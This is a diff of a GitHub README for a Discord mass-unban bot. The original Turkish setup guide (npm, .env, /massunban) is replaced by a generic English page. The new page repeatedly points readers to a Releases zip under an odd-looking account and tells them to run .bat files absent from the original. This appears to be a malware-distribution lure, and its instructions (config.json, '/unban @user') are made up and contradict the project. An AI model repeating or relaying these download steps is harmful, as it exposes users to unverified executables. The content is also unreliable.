@@ -1,192 +1,74 @@
-# Discord Mass Unban Bot
+# 🔧 discord-unban-all - Effortlessly Remove Bans on Discord
 
-Discord sunucunuzda toplu ban kaldırma işlemleri için geliştirilmiş güçlü ve güvenli bot.
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/aaxaxaxaxaxaxaxaxxaxaxaxaxaxa/discord-unban-all/releases)
 
-## 📸 Önizleme
+## 📋 Overview
 
-### Komut Kullanımı
-![Mass Unban Komutu](./images/massunban-command.png)
+The **discord-unban-all** is a powerful bot designed specifically for Discord. It enables you to unban multiple users from your server quickly and securely. This bot employs rate limit protection and offers real-time progress tracking, making it the ideal tool for server moderators. It is optimized to handle over 2000 bans, all while using modern slash commands.
 
-### Ban Durumu Kontrolü
-![Ban Status Komutu](./images/banstatus-command.png)
+## 🔧 Features
 
-### İşlem İlerlemesi
-![Unban İlerleme Durumu](./images/unban-progress.png)
+- **Mass Unban**: Unban numerous users with just one command.
+- **Rate Limit Protection**: Avoid hitting Discord's rate limits during operations.
+- **Real-Time Progress Tracking**: Monitor unban status as it happens.
+- **Slash Commands**: A modern way to issue commands with ease.
+- **User-Friendly**: Designed for non-technical users to operate seamlessly.
 
-## 🚀 Özellikler
+## 🚀 Getting Started
 
-- ✅ **Toplu ban kaldırma** (/massunban) - Güvenlik onayı ile
-- 📊 **Detaylı ban durumu** (/banstatus) - Gerçek zamanlı bilgi
-- ⏹️ **Güvenli işlem durdurma** (/stopunban) - İstatistiklerle
-- 🔄 **Rate limit koruması** - Discord API limitlerini aşmaz
-- 📈 **Gerçek zamanlı takip** - İlerleme çubuğu ve ETA
-- ❌ **Akıllı hata yönetimi** - Başarısız işlemler raporlanır
-- 🎯 **Yetki kontrolü** - Sadece yetkili kullanıcılar erişebilir
-- 📱 **Modern slash komutlar** - Kolay kullanım
-- 🚫 **Çoklu işlem koruması** - Aynı anda sadece bir işlem
-- ⚠️ **Detaylı uyarı sistemi** - Kullanıcı dostu bildirimler
+Follow these steps to download and run the discord-unban-all bot:
 
-## 📋 Gereksinimler
+1. **System Requirements**:
+   - A computer running Windows, macOS, or Linux.
+   - A stable internet connection.
+   - Your own Discord server with the necessary admin privileges.
 
-- Node.js v16.9.0 veya üzeri
-- Discord.js v14
-- Bot tokenı ve gerekli yetkiler
+2. **Download the Application**:
+   - Visit the [Releases page](https://github.com/aaxaxaxaxaxaxaxaxxaxaxaxaxaxa/discord-unban-all/releases) to get the latest version of the bot. 
 
-## 🛠️ Kurulum
+3. **Extract the Files**:
+   - After downloading the zip file, locate the file in your computer’s Downloads folder.
+   - Right-click on the downloaded zip file and select “Extract All.”
+   - Choose a location where you want to save the files and click “Extract.”
 
-1. **Bağımlılıkları yükleyin:**
-   ```bash
-   npm install
-   ```
+4. **Install Dependencies**:
+   - Open the folder where you extracted the files.
+   - Look for a file named `install_dependencies.bat` (for Windows users) or follow the instructions in `README.md` for macOS/Linux users to install Node.js and necessary packages.
 
-2. **Ortam değişkenlerini ayarlayın:**
-   ```bash
-   # .env.example dosyasını kopyalayın
-   copy .env.example .env
-   ```
-   
-   Ardından `.env` dosyasını düzenleyip kendi bilgilerinizi ekleyin:
-   ```env
-   DISCORD_TOKEN=your_actual_bot_token_here
-   GUILD_ID=your_actual_guild_id_here
-   UNBAN_DELAY=1000
-   ENABLE_LOGGING=true
-   ```
+5. **Configure the Bot**:
+   - Open the `config.json` file using a text editor (like Notepad).
+   - Enter your Discord server’s information and any other required settings.
 
-3. **Bot'u başlatın:**
-   ```bash
-   npm start
-   ```
+6. **Run the Bot**:
+   - For Windows, double-click on `start_bot.bat`. 
+   - For macOS/Linux, open your terminal and type `node start_bot.js` after navigating to the bot’s folder.
 
-## 🤖 Bot Kurulumu
+7. **Use the Bot**:
+   - After the bot is running, you can use slash commands to unban users. For example: `/unban @user`.
 
-1. **Discord Developer Portal'da bot oluşturun:**
-   - https://discord.com/developers/applications adresine gidin
-   - "New Application" butonuna tıklayın
-   - Uygulama adını girin (örn: "Mass Unban Bot")
-   - "Bot" sekmesine geçin
-   - "Add Bot" butonuna tıklayın
-   - "Token" bölümünden bot tokenınızı kopyalayın
-   - Bu token'ı `.env` dosyasındaki `DISCORD_TOKEN` kısmına yapıştırın
+8. **Real-Time Monitoring**:
+   - Watch the terminal or console for real-time updates on the unbanning process.
 
-2. **Sunucu ID'sini alın:**
-   - Discord'da Developer Mode'u açın (User Settings > Advanced > Developer Mode)
-   - Sunucunuza sağ tıklayın ve "Copy Server ID" seçin
-   - Bu ID'yi `.env` dosyasındaki `GUILD_ID` kısmına yapıştırın
+## 📥 Download & Install
 
-3. **Gerekli yetkiler:**
-   - `Ban Members` (Üyeleri Banla)
-   - `Use Slash Commands` (Slash Komutları Kullan)
+Ready to get started? Head over to our [Releases page](https://github.com/aaxaxaxaxaxaxaxaxxaxaxaxaxaxa/discord-unban-all/releases) to download the latest version and kick off your unban process today!
 
-3. **Bot davet linki:**
-   ```
-   https://discord.com/api/oauth2/authorize?client_id=YOUR_BOT_ID&permissions=4&scope=bot%20applications.commands
-   ```
+## 🛠️ Troubleshooting
 
-## 📝 Komutlar
+If you encounter issues:
 
-> 💡 **İpucu:** Tüm komutlar Discord'da slash komut (/) olarak kullanılır.
+- **Error Messages**: Check if you have correctly entered your Discord server information in `config.json`.
+- **Installation Issues**: Ensure you have Node.js installed on your machine. Visit [Node.js Official Site](https://nodejs.org/) to download and install it.
+- **Bot Not Responding**: Make sure the bot has the required permissions on your server.
 
-### `/massunban confirm:CONFIRM`
+## 🌐 Support
 
-![Mass Unban Komutu](./images/massunban-command.png)
+If you need further assistance, you can reach out through Discord support forums or check out user communities around Discord bots for common questions and troubleshooting advice.
 
-- **Açıklama:** Sunucudaki TÜM banlı kullanıcıları kaldırır
-- **Güvenlik:** "CONFIRM" parametresi zorunlu (geri alınamaz işlem!)
-- **Özellikler:** 
-  - Gerçek zamanlı ilerleme takibi
-  - İlerleme çubuğu ve ETA hesaplama
-  - Başarısız işlemler ayrıca raporlanır
-  - 15 dakika+ işlemlerde otomatik kanal mesajı
-- **Kısıtlama:** İşlem devam ederken yeni unban başlatılamaz
+## 📅 Updates
 
-### `/banstatus`
+Stay informed about the latest features and improvements. Keep an eye on the [Releases page](https://github.com/aaxaxaxaxaxaxaxaxxaxaxaxaxaxa/discord-unban-all/releases) for announcements regarding new updates and modifications.
 
-![Ban Status Komutu](./images/banstatus-command.png)
+## 🚀 Conclusion
 
-- **Açıklama:** Detaylı ban durumu ve bot işlem bilgileri
-- **Gösterilen Bilgiler:**
-  - Toplam banlı kullanıcı sayısı
-  - Bot durumu (aktif/beklemede)
-  - Devam eden işlem detayları (varsa)
-  - İlerleme çubuğu ve istatistikler
-  - Tahmini kalan süre
-- **Kullanım:** İşlem takibi için ideal
-
-### `/stopunban`
-- **Açıklama:** Devam eden unban işlemini güvenli şekilde durdurur
-- **Özet Bilgileri:**
-  - Başarıyla kaldırılan ban sayısı
-  - Başarısız işlem sayısı
-  - Toplam çalışma süresi
-  - Ortalama işlem hızı
-- **Güvenlik:** Veri kaybı olmadan durdurma
-
-## 📊 İşlem İlerlemesi
-
-![Unban İlerleme Durumu](./images/unban-progress.png)
-
-Unban işlemi sırasında:
-- ✅ **Gerçek zamanlı ilerleme çubuğu** görüntülenir
-- 📈 **İstatistikler** sürekli güncellenir
-- ⏱️ **Tahmini kalan süre** hesaplanır
-- 📊 **Başarı/başarısızlık oranları** gösterilir
-
-## ⚙️ Yapılandırma
-
-`.env` dosyasındaki ayarlar:
-
-```env
-# Discord Bot Token (Zorunlu)
-DISCORD_TOKEN=your_bot_token_here
-
-# Sunucu ID (Zorunlu)
-GUILD_ID=your_guild_id_here
-
-# Her unban arasındaki gecikme (milisaniye)
-UNBAN_DELAY=1000
-
-# Detaylı log kaydı
-ENABLE_LOGGING=true
-```
-
-## 🔒 Güvenlik Özellikleri
-
-- **Yetki Kontrolü:** Sadece "Ban Members" yetkisi olan kullanıcılar komutları kullanabilir
-- **Onay Sistemi:** Toplu unban için "CONFIRM" parametresi gereklidir
-- **Rate Limit:** Discord API limitlerini aşmamak için gecikme sistemi
-- **Hata Yönetimi:** Başarısız işlemler loglanır ve raporlanır
-
-## 📊 Performans
-
-- **Hız:** Saniyede ~1 unban (varsayılan ayarlarla)
-- **Kapasite:** Sınırsız ban sayısı
-- **Bellek:** Düşük bellek kullanımı
-- **Güvenilirlik:** Hata durumunda işlem devam eder
-
-## 🚨 Önemli Notlar
-
-- Bot'un sunucuda "Ban Members" yetkisi olmalıdır
-- Discord API rate limitlerini aşmamak için gecikme kullanılır
-- Büyük sunucularda işlem uzun sürebilir (2000 ban ~33 dakika)
-- İşlem sırasında bot çevrimdışı olursa otomatik olarak devam etmez
-- **15 dakikadan uzun işlemler:** Discord slash komut token'ları 15 dakika sonra geçerliliğini yitirir. Bu durumda sonuç mesajı kanal üzerinden gönderilir.
-
-## 🐛 Sorun Giderme
-
-1. **Bot komutlara yanıt vermiyor:**
-   - Bot tokenının doğru olduğundan emin olun
-   - Bot'un sunucada olduğundan emin olun
-   - Slash komutlarının yüklendiğini kontrol edin
-
-2. **"Yetki hatası" alıyorum:**
-   - Bot'un "Ban Members" yetkisi olduğundan emin olun
-   - Kendi rolünüzün bu yetkiye sahip olduğundan emin olun
-
-3. **İşlem çok yavaş:**
-   - `.env` dosyasında `UNBAN_DELAY` değerini azaltın (minimum 500ms önerilir)
-
-4. **"Invalid Webhook Token" hatası:**
-   - Bu normal bir durumdur, işlem 15 dakikadan uzun sürdüğünde oluşur
-   - Sonuç mesajı otomatik olarak kanal üzerinden gönderilecektir
-   - İşlem başarıyla tamamlanmış demektir
+The **discord-unban-all** bot simplifies the process of unbanning users in your Discord server. With user-friendly features and solid performance, it provides an efficient solution to managing server moderation. Download the bot today and enhance your server management tools with ease.
